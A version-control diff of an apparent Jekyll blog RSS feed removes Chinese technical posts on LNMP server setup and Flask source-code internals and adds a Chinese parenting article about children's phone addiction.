-    location ~ /\.(ht|svn|git) {
-        deny  all;
-    }
-
-    location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ {
-        expires  50d;
-    }
-
-    location ~ .*\.(js|css)?$ {
-        expires  50d;
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;启动nginx&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$HOME/local/nginx/sbin/nginx -c $HOME/local/nginx/conf/nginx.conf
-
-#配置重启
-$HOME/local/nginx/sbin/nginx -s reload
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;php安装&quot;&gt;php安装&lt;/h3&gt;
-
-&lt;p&gt;下载源码：&lt;a href=&quot;http://am1.php.net/get/php-7.1.2.tar.gz/from/this/mirror&quot;&gt;php源码&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;有必要指定依赖路径，例如 –with-zlib, –with-openssl&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tar xzvf php-7.1.2.tar.gz
-cd php-7.1.2
-./configure  --prefix=$HOME/local/php --with-pdo-mysql=mysqlnd --with-mysqli=mysqlnd --enable-mysqlnd --enable-mbstring --enable-mbregex --with-curl --enable-sockets --with-iconv --with-freetype-dir --with-png-dir --with-jpeg-dir --with-gd --with-zlib=$HOME/local/zlib --enable-xml --with-openssl=$HOME/local/openssl --enable-pcntl --enable-zip --with-bz2 --enable-soap --enable-exif --enable-ftp --enable-shmop --with-libxml-dir --with-mhash --with-xmlrpc --enable-wddx --with-curl --enable-fpm
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;编辑$HOME/local/php/etc/php-fpm.conf，打开配置&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pid = run/php-fpm.pid
-error_log = log/php-fpm.log
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;编辑$HOME/local/php/etc/php-fpm.d/www.conf&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;listen.owner = xxx_user
-listen.group = xxx_user
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;启动php-fpm:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$HOME/local/php/sbin/php-fpm
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;再在&lt;code class=&quot;highlighter-rouge&quot;&gt;$HOME/web/webroot/www.test.com/html&lt;/code&gt; 下新建index.php，内容编辑如下：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
-    phpinfo();
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;就能看到正常的网页显示php信息了。&lt;/p&gt;
-</description>
-        <pubDate>Mon, 14 Aug 2017 16:09:01 +0800</pubDate>
-        <link>http://localhost:4000/2017/08/14/lnmp/</link>
-        <guid isPermaLink="true">http://localhost:4000/2017/08/14/lnmp/</guid>
-        
-        <category>教程</category>
-        
-        
-        <category>document</category>
-        
-      </item>
-    
-      <item>
-        <title>flask源码分析：启动流程</title>
-        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#启动流程&quot; id=&quot;markdown-toc-启动流程&quot;&gt;启动流程&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#路由过程&quot; id=&quot;markdown-toc-路由过程&quot;&gt;路由过程&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;要了解flask的启动流程，先要了解基本的wsgi协议：&lt;a href=&quot;http://cizixs.com/2014/11/08/understand-wsgi&quot;&gt;wsgi介绍&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;启动流程&quot;&gt;启动流程&lt;/h3&gt;
-
-&lt;p&gt;这里我们要弄清楚一个核心流程，当一个请求request过来时（信息都在environ里），中间经过那些处理流程，最后返回start_response的。&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from flask import Flask
-app = Flask(__name__)
-
-if __name__ == '__main__':
-    app.run()
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;只需要以上几行代码就可以启动flask，先看&lt;code class=&quot;highlighter-rouge&quot;&gt;Flask.__init__()&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;Flask.run()&lt;/code&gt;，做了什么：&lt;/p&gt;
-
-&lt;p&gt;Flask继承&lt;code class=&quot;highlighter-rouge&quot;&gt;_PackageBoundObject&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;_PackageBoundObject&lt;/code&gt;处理以下逻辑：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;根据传入的root_path，或者使用import_name获取root_path&lt;/li&gt;
-  &lt;li&gt;静态资源文件夹属性，static_url_path属性&lt;/li&gt;
-  &lt;li&gt;Jinja loader&lt;/li&gt;
-  &lt;li&gt;发送静态文件&lt;/li&gt;
-  &lt;li&gt;open_resource打开root_path下的资源文件&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Flask.__init__&lt;/code&gt;的处理逻辑：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;根据default_config创建config实例&lt;/li&gt;
-  &lt;li&gt;初始化很多属性：url_map，系列钩子函数dict或list，extensions等&lt;/li&gt;
-  &lt;li&gt;自动加上静态文件路由&lt;/li&gt;
-  &lt;li&gt;创建click.Group，实现相关命令行的功能（涉及到click）&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if self.has_static_folder:
-    assert bool(static_host) == host_matching, 'Invalid static_host/host_matching combination'
-    self.add_url_rule(
-        self.static_url_path + '/&amp;lt;path:filename&amp;gt;',
-        endpoint='static',
-        host=static_host,
-        view_func=self.send_static_file
-    )
-
-#: The click command line context for this application.  Commands
-#: registered here show up in the :command:`flask` command once the
-#: application has been discovered.  The default commands are
-#: provided by Flask itself and can be overridden.
-#:
-#: This is an instance of a :class:`click.Group` object.
-self.cli = cli.AppGroup(self.name)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;再看&lt;code class=&quot;highlighter-rouge&quot;&gt;Flask.run&lt;/code&gt;: &lt;code class=&quot;highlighter-rouge&quot;&gt;Flask.run&lt;/code&gt;除了设置可选的host，port参数外，只是调用了&lt;code class=&quot;highlighter-rouge&quot;&gt;werkzeug.serving.run_simple&lt;/code&gt;，然后运行&lt;code class=&quot;highlighter-rouge&quot;&gt;BaseWSGIServer.serve_forever&lt;/code&gt;，永久的监听请求，当有请求来时，会调用WSGIRequestHandler.execute里：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def execute(app):
-    application_iter = app(environ, start_response)
-    try:
-        for data in application_iter:
-            write(data)
-        if not headers_sent:
-            write(b'')
-    finally:
-        if hasattr(application_iter, 'close'):
-            application_iter.close()
-        application_iter = None
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;会调用实例app()，可参考&lt;a href=&quot;http://cizixs.com/2014/11/08/understand-wsgi&quot;&gt;wsgi协议介绍&lt;/a&gt;，这里就和Flask的app实例结合起来了。因为Flask实现了&lt;code class=&quot;highlighter-rouge&quot;&gt;__call__&lt;/code&gt;，支持对象调用：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def __call__(self, environ, start_response):
-    &quot;&quot;&quot;Shortcut for :attr:`wsgi_app`.&quot;&quot;&quot;
-    return self.wsgi_app(environ, start_response)
-
-def wsgi_app(self, environ, start_response):
-    ctx = self.request_context(environ)
-    error = None
-    try:
-        try:
-            ctx.push()
-            # 这里由经路由处理函数后的结果，并由body结果生成Response对象
-            response = self.full_dispatch_request()
-        except Exception as e:
-            error = e
-            response = self.handle_exception(e)
-        except:
-            error = sys.exc_info()[1]
-            raise
-        return response(environ, start_response)
-    finally:
-        if self.should_ignore_error(error):
-            error = None
-        ctx.auto_pop(error)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;去掉钩子函数处理，这里主要的一个request流程：&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;创建RequestContext(内生成Request)&lt;/li&gt;
-  &lt;li&gt;RequestContext压栈&lt;/li&gt;
-  &lt;li&gt;处理request得到response实例（Response处理header信息，并保存[body]）&lt;/li&gt;
-  &lt;li&gt;response的&lt;code class=&quot;highlighter-rouge&quot;&gt;__call__&lt;/code&gt;里调用start_response返回状态码和header&lt;/li&gt;
-  &lt;li&gt;返回可迭代的对象（内包含body数据）&lt;/li&gt;
-  &lt;li&gt;RequestContext出栈&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;路由过程&quot;&gt;路由过程&lt;/h3&gt;
-
-&lt;p&gt;注册路由&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Basically this example::
-
-    @app.route('/')
-    def index():
-        pass
-
-Is equivalent to the following::
-
-    def index():
-        pass
-    app.add_url_rule('/', 'index', index)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;主要调用add_url_rule()，add_url_rule根据函数名称生成endpint，分别将url-&amp;gt;endpint的url存储到url_map，endpint-&amp;gt;view_function存储到view_functions中&lt;/p&gt;
-
-&lt;p&gt;所以url_map和view_functions支持了整个路由的数据过程，当请求来时，由RequestContext实现匹配的过程。&lt;/p&gt;
-
-&lt;p&gt;RequestContext的代码去掉压栈和出栈过程，和请求处理相关的代码如下：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class RequestContext(object):
-    def __init__(self, app, environ, request=None):
-    self.app = app
-    if request is None:
-        request = app.request_class(environ)
-    self.request = request
-    self.url_adapter = app.create_url_adapter(self.request)
-    self.flashes = None
-    self.session = None
-
-    self.match_request()
-
-    def match_request(self):
-        &quot;&quot;&quot;Can be overridden by a subclass to hook into the matching
-        of the request.
-        &quot;&quot;&quot;
-        try:
-            url_rule, self.request.view_args = \
-                self.url_adapter.match(return_rule=True)
-            self.request.url_rule = url_rule
-        except HTTPException as e:
-            self.request.routing_exception = e
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;ul&gt;
-  &lt;li&gt;RequestContext里面缓存的变量有app，session，request flashes，url_adapter，environ传递给request（两者互相绑定）&lt;/li&gt;
-  &lt;li&gt;将app的url_map绑定到Request.environ上，url_map为Map对象，包含了Rule（url-&amp;gt;endpoint），再创建werkzeug.routing.MapAdapter对象&lt;/li&gt;
-  &lt;li&gt;调用MapAdapter.match方法进行匹配，得到Rule，即url-&amp;gt;endpoint，并把Rule存储到Request里&lt;/li&gt;
-  &lt;li&gt;最后调用&lt;code class=&quot;highlighter-rouge&quot;&gt;self.view_functions[rule.endpoint](**req.view_args)&lt;/code&gt;，用endpoint获取到对应的view_function处理&lt;/li&gt;
-&lt;/ul&gt;
-</description>
-        <pubDate>Mon, 31 Jul 2017 10:18:01 +0800</pubDate>
-        <link>http://localhost:4000/2017/07/31/flask%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/</link>
-        <guid isPermaLink="true">http://localhost:4000/2017/07/31/flask%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/</guid>
-        
-        <category>总结</category>
-        
-        
-        <category>reading</category>
-        
-      </item>
-    
-      <item>
-        <title>flask源码分析：相关基础知识</title>
-        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#装饰器&quot; id=&quot;markdown-toc-装饰器&quot;&gt;装饰器&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#类&quot; id=&quot;markdown-toc-类&quot;&gt;类&lt;/a&gt;    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#属性访问限制&quot; id=&quot;markdown-toc-属性访问限制&quot;&gt;属性访问限制&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#获取对象信息&quot; id=&quot;markdown-toc-获取对象信息&quot;&gt;获取对象信息&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#其他特殊保留属性&quot; id=&quot;markdown-toc-其他特殊保留属性&quot;&gt;其他特殊保留属性&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#父母课堂孩子暑假沉迷手机家长督促功课无效&quot; id=&quot;markdown-toc-父母课堂孩子暑假沉迷手机家长督促功课无效&quot;&gt;父母课堂│孩子暑假沉迷手机？家长督促功课无效？&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#妈妈没收了孩子的手机之后&quot; id=&quot;markdown-toc-妈妈没收了孩子的手机之后&quot;&gt;妈妈没收了孩子的手机之后&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#孩子沉迷手机家长强制禁止可行吗&quot; id=&quot;markdown-toc-孩子沉迷手机家长强制禁止可行吗&quot;&gt;孩子沉迷手机，家长强制禁止可行吗？&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#父母应该怎么做&quot; id=&quot;markdown-toc-父母应该怎么做&quot;&gt;父母应该怎么做？&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#金榜教育&quot; id=&quot;markdown-toc-金榜教育&quot;&gt;金榜教育&lt;/a&gt;&lt;/li&gt;
     &lt;/ul&gt;
   &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#flask里重命名的class&quot; id=&quot;markdown-toc-flask里重命名的class&quot;&gt;Flask里重命名的Class&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;因为接触python语言没多久，开始看flask源码的时候比较费劲，python的哲学是简单优雅，尽量易懂，更少的代码。虽然如此，但多年使用c++，很多底层，数据结构都需要自己去实现的缘故，总会对python很多语法，数据结构，模块云里雾里，这篇文章先总结下flask所使用到的python基础知识。&lt;/p&gt;
+&lt;h2 id=&quot;父母课堂孩子暑假沉迷手机家长督促功课无效&quot;&gt;父母课堂│孩子暑假沉迷手机？家长督促功课无效？&lt;/h2&gt;
 
-&lt;p&gt;python支持函数def，闭包，还有很多函数工具集，如&lt;code class=&quot;highlighter-rouge&quot;&gt;functools&lt;/code&gt;等所以能很好的支持面向过程编程。&lt;/p&gt;
+&lt;p&gt;2017-08-18 金榜教育&lt;/p&gt;
 
-&lt;p&gt;python又能支持class，&lt;code class=&quot;highlighter-rouge&quot;&gt;__xx__&lt;/code&gt;变量，&lt;code class=&quot;highlighter-rouge&quot;&gt;property&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;type&lt;/code&gt;，元类，多继承，多态等，所以又能支持很强大的面向对象编程。&lt;/p&gt;
+&lt;p&gt;现在这个时代，手机作为生活的工具，已经融入了孩子们的生活。孩子和家长关于”手机”引发的矛盾，更是愈演愈烈。&lt;/p&gt;
 
-&lt;h3 id=&quot;装饰器&quot;&gt;装饰器&lt;/h3&gt;
+&lt;p&gt;针对孩子沉迷手机这个普遍性的难题，给大家讲两则故事，希望大家能从中受到启发，在孩子的教育问题上少一些阻碍。&lt;/p&gt;
 
-&lt;p&gt;装饰模式有很多经典的使用场景，例如插入日志、性能测试、事务处理等等，利用装饰器，可提取大量函数中与本身功能无关的类似代码，从而达到代码重用的目的。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/static/images/1.jpg&quot; alt=&quot;孩子沉迷手机&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;装饰器是基于函数也是对象（可当做参数传递），闭包，以及可变参数、关键字参数来实现的。&lt;/p&gt;
+&lt;h3 id=&quot;妈妈没收了孩子的手机之后&quot;&gt;妈妈没收了孩子的手机之后&lt;/h3&gt;
 
-&lt;p&gt;先来看两个例子：&lt;/p&gt;
+&lt;p&gt;小武妈妈因为孩子沉迷手机，上星期把他手机收缴了。前天陪孩子出门，他见到一个小吃店，说要去买点吃的东西。但妈妈在车上等了六、七分钟还没见他回，就自己下车去小吃店看看。&lt;/p&gt;
 
-&lt;p&gt;无参数装饰器&lt;/p&gt;
+&lt;p&gt;孩子正在店里一个角落，玩一部智能手机。他一看见妈妈进来，就赶紧收起手机。&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def log(func):
-    def wrapper(*args, **kw):
-        print('log: call function %s()' % func.__name__)
-        return func(*args, **kw)
-    return wrapper
+&lt;p&gt;问他手机是谁的，他很不高兴地说是借同学的，之前因为母子之间为手机多次发生冲突，所以，妈妈也没有逼他交出来，就跟他说——尽快还给同学吧，今后不许找同学借。&lt;/p&gt;
 
-@log
-def now():
-    print('now: 2017-07-27')
-
-&amp;gt;&amp;gt;&amp;gt; now()
-log: call function now()
-now: 2017-07-27
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;装饰器没有额外参数，只接受一个紧跟的func参数。&lt;code class=&quot;highlighter-rouge&quot;&gt;@log&lt;/code&gt;实际上是类似语法糖的效果，等价于：&lt;code class=&quot;highlighter-rouge&quot;&gt;now = log(now)&lt;/code&gt; 实际上也等价于 &lt;code class=&quot;highlighter-rouge&quot;&gt;now = wrapper&lt;/code&gt;，而因为闭包，wrapper可以访问到func参数。&lt;/p&gt;
-
-&lt;p&gt;这样在以后调用&lt;code class=&quot;highlighter-rouge&quot;&gt;now()&lt;/code&gt;时，相当于：执行&lt;code class=&quot;highlighter-rouge&quot;&gt;log(now)()&lt;/code&gt;， 而&lt;code class=&quot;highlighter-rouge&quot;&gt;log(now)&lt;/code&gt;执行结果为返回wrapper函数，这样对now的调用，自动切换为&lt;code class=&quot;highlighter-rouge&quot;&gt;wrapper()&lt;/code&gt;的调用。wrapper在封装了自己的处理逻辑后，仍然执行真正now的调用。&lt;/p&gt;
-
-&lt;p&gt;再看一个带参数的例子：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import functools
-
-def log(text):
-    def decorator(func):
-        # 更改函数名称__name__使用
-        @functools.wraps(func)
-        def wrapper(*args, **kw):
-            print('%s %s():' % (text, func.__name__))
-            return func(*args, **kw)
-        return wrapper
-    return decorator
-
-@log('log: execute')
-def now():
-    print('now: 2017-07-27')
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;functools.wraps&lt;/code&gt;的作用一会再介绍，可先忽略。整个定义过程相当于 &lt;code class=&quot;highlighter-rouge&quot;&gt;now = log('log: execute')(now)&lt;/code&gt;。 调用now函数变成了：&lt;code class=&quot;highlighter-rouge&quot;&gt;log('log: execute')(now)()&lt;/code&gt;。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;functool.update_wrapper&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;按照上面的逻辑，实际上&lt;code class=&quot;highlighter-rouge&quot;&gt;now()&lt;/code&gt;已被更改过，查看&lt;code class=&quot;highlighter-rouge&quot;&gt;now.__name__&lt;/code&gt;会看到已经变为&lt;code class=&quot;highlighter-rouge&quot;&gt;'wrapper'&lt;/code&gt;，所以需要把now()的属性复制到wrapper中，否则会导致有些依赖函数签名的代码报错，而&lt;code class=&quot;highlighter-rouge&quot;&gt;functools.wraps&lt;/code&gt;就是干这个事情的。&lt;/p&gt;
-
-&lt;p&gt;查看fuctools.py的wraps相关代码(去掉了注释)：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;WRAPPER_ASSIGNMENTS = ('__module__', '__name__', '__qualname__', '__doc__',
-                       '__annotations__')
-WRAPPER_UPDATES = ('__dict__',)
-def update_wrapper(wrapper,
-                   wrapped,
-                   assigned = WRAPPER_ASSIGNMENTS,
-                   updated = WRAPPER_UPDATES):
-    for attr in assigned:
-        try:
-            value = getattr(wrapped, attr)
-        except AttributeError:
-            pass
-        else:
-            setattr(wrapper, attr, value)
-    for attr in updated:
-        getattr(wrapper, attr).update(getattr(wrapped, attr, {}))
-    # Issue #17482: set __wrapped__ last so we don't inadvertently copy it
-    # from the wrapped function when updating __dict__
-    wrapper.__wrapped__ = wrapped
-    # Return the wrapper so this can be used as a decorator via partial()
-    return wrapper
-
-def wraps(wrapped,
-          assigned = WRAPPER_ASSIGNMENTS,
-          updated = WRAPPER_UPDATES):
-    return partial(update_wrapper, wrapped=wrapped,
-                   assigned=assigned, updated=updated)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wraps&lt;/code&gt;也是个带参数的装饰器，参数为原始函数，这里即&lt;code class=&quot;highlighter-rouge&quot;&gt;now()&lt;/code&gt;，后面再紧跟wrapper函数为参数，wraps内部利用偏函数，实际上是调用的&lt;code class=&quot;highlighter-rouge&quot;&gt;update_wrapper&lt;/code&gt;: 更新wrapper函数，使其看起来像wrapped函数. 这个函数除了更新wrapper的属性之外，会继续返回wrapper。而看update_wrapper更新的属性有，&lt;code class=&quot;highlighter-rouge&quot;&gt;__module__&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;__name__&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;__qualname__&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;__doc__&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;__annotations__&lt;/code&gt;，并更新wrapper的&lt;code class=&quot;highlighter-rouge&quot;&gt;__dict__&lt;/code&gt;和wrapped的一致。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;flask 里装饰器应用实例&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;在flask的app.py里，有装饰器&lt;code class=&quot;highlighter-rouge&quot;&gt;setupmethod&lt;/code&gt;，这个装饰器在debug模式下如果有晚于第一个请求注册的函数，就触发异常，比如注册蓝图的函数调用。所以以&lt;code class=&quot;highlighter-rouge&quot;&gt;setupmethod&lt;/code&gt;装饰的所有函数都是需要在app启动之前，就注册完毕的函数。&lt;/p&gt;
-
-&lt;h3 id=&quot;类&quot;&gt;类&lt;/h3&gt;
-
-&lt;p&gt;flask框架基本用的面向对象编程，所以有必要很清楚了解类。&lt;code class=&quot;highlighter-rouge&quot;&gt;__xxx__&lt;/code&gt;变量和属性，&lt;code class=&quot;highlighter-rouge&quot;&gt;property&lt;/code&gt;，descriptor，type(), 元类等等&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;属性访问限制&quot;&gt;属性访问限制&lt;/h4&gt;
-
-&lt;p&gt;类的内部可以有属性和方法，方法其实也可以当做属性，通常属性可以看成c++里面的成员变量。先看一个关于属性例子：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class LocalProxy(object):
-
-    # 类属性
-    class_prop = 'class_prop'
-    # 类属性 约定俗成可访问的私有变量 但外面尽量不要调用
-    _class_prop = '_class_prop'
-    # 类属性 私有变量 实际上会重新命名为 _LocalProxy__class_prop，即前面加上类名
-    __class_prop = '__class_prop'
-    # 类属性 双下划线开头并结尾的为特殊变量，大多有特殊用途
-    __class_prop__ = '__class_prop__'
-    # 类属性，测试实例属性覆盖该属性
-    cover_prop = 'class_over_prop'
-
-    def __init__(self, local, name=None):
-        object.__setattr__(self, '_LocalProxy__local', local)
-        object.__setattr__(self, '__name__', name)
-
-        # 实例属性
-        self.obj_prop = 'obj_prop'
-        # 实例可访问的私有变量
-        self._obj_prop = '_obj_prop'
-        # 实例私有变量，会重新命名为_LocalProxy__obj_prop
-        self.__obj_prop = '__obj_prop'
-        # 实例特殊变量
-        self.__obj_prop__ = '__obj_prop__'
-        # 实例属性，测试覆盖类属性
-        self.cover_prop = 'obj_cover_prop'
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;上面的例子在注释中基本已说明：&lt;/p&gt;
+&lt;p&gt;从这件事我们发现一个事实：&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;实例属性会覆盖类属性&lt;/li&gt;
-  &lt;li&gt;加下划线的私有变量，只是约定俗成为私有变量，但实际上外面仍然可以访问的到&lt;/li&gt;
-  &lt;li&gt;加双下划线的私有变量，只是内部加了&lt;code class=&quot;highlighter-rouge&quot;&gt;_类名前缀&lt;/code&gt;，在werkzeug的local.py中LocalProxy，内部就使用了，通过加类名前缀的方式，直接访问私有变量：&lt;code class=&quot;highlighter-rouge&quot;&gt;object.__setattr__(self, '_LocalProxy__local', local)&lt;/code&gt;。&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__xxx__&lt;/code&gt;类似变量，为特殊属性，在python中有特别多的这种属性，如&lt;code class=&quot;highlighter-rouge&quot;&gt;__dict__&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;__getattribute__&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;__reduce__&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;__doc__&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;__repr__&lt;/code&gt;等等&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;借他人的玩——耗费自己的时间、情感等，以讨好建立社交关系而换取；&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;偷他人的玩——趁他人不知情、不注意时，私自取走他人财物；&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;抢他人的玩——以损害德性和良知的方式，“霸凌”他人获取财物；&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;接受馈赠玩——接受他人馈赠，而导致“被爱”认知的重新定义。&lt;/p&gt;
+  &lt;/li&gt;
 &lt;/ul&gt;
+
+&lt;h3 id=&quot;孩子沉迷手机家长强制禁止可行吗&quot;&gt;孩子沉迷手机，家长强制禁止可行吗？&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/images/2.jpg&quot; alt=&quot;孩子沉迷手机&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;近日，家在广州的梁先生就尝到了后果：儿子一怒之下，砸碎了家中价值180万的古青花瓷碗！&lt;/p&gt;
+
+&lt;p&gt;他上五年级的儿子小浩，平时喜欢玩手机游戏，最近更是迷上了，不论是在路上，餐桌上，还是在床上，总是低头玩游戏。&lt;/p&gt;
+
+&lt;p&gt;家长不论怎么劝，小浩就是不听。梁太太经常对着梁先生唠叨，希望做爸爸的能解决这个问题。&lt;/p&gt;
+
+&lt;h3 id=&quot;父母应该怎么做&quot;&gt;父母应该怎么做？&lt;/h3&gt;
+
+&lt;p&gt;1、要清晰地指出孩子需要改进的行为。&lt;/p&gt;
+
+&lt;p&gt;2、要清楚地说明孩子完成约定可以得到什么，和没有完成约定将失去什么。&lt;/p&gt;
+
+&lt;p&gt;3、要把约定书面化，并张贴在家里的显眼处，让孩子和家长时时刻刻可以看到。&lt;/p&gt;
+
+&lt;p&gt;4、也是最重要的一点，就是要注重“约法三章”的 “约”字。&lt;/p&gt;
 
 &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;获取对象信息&quot;&gt;获取对象信息&lt;/h4&gt;
 
-&lt;p&gt;如果要获得一个对象的所有属性和方法，可以使用&lt;code class=&quot;highlighter-rouge&quot;&gt;dir()&lt;/code&gt;函数。另外还有全局函数&lt;code class=&quot;highlighter-rouge&quot;&gt;getattr()&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;setattr()&lt;/code&gt;以及&lt;code class=&quot;highlighter-rouge&quot;&gt;hasattr()&lt;/code&gt;。&lt;a href=&quot;https://docs.python.org/3/library/functions.html&quot;&gt;查看更多内建函数&lt;/a&gt;。&lt;/p&gt;
+&lt;h3 id=&quot;金榜教育&quot;&gt;金榜教育&lt;/h3&gt;
 
-&lt;p&gt;&lt;strong&gt;属性get系列函数&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/static/images/3.jpg&quot; alt=&quot;孩子沉迷手机&quot; /&gt;&lt;/p&gt;
 
